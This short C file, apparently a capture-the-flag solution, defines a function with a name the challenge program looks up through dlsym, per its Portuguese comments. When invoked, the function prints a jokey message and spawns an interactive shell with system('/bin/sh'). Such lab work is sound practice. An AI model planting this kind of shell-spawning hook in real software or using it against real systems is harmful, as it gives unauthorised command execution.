#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// O programa do CTF busca exatamente por este nome:
void resposta_deuses() {
    printf("[+] dlsym encontrou a funcao! Invocando shell aaaaaaah rasengan...\n");
    
    // Executa a shell interativa
    system("/bin/sh");
}
